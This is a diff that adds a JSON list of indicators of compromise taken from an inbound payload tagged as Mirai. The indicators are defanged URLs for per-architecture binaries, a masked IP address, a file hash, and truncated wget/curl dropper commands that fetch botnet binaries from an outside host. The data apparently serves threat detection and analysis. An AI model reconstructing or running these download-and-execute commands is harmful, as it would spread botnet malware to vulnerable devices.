@@ -1,0 +1,182 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxni386xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnloongarch64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41[.]216[.]189[.]XXX/bins/xnxn"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "41[.]216[.]189.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnaarch64x"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxni386xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxni386xnxn; c"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnloon"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; c"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmicro"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; c"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; c"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnpowerpcx"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv32x"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnriscv64x"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnx86_64xnx"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41[.]216[.]189[.]XXX/bins/xnxn"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc"
+  }
+]
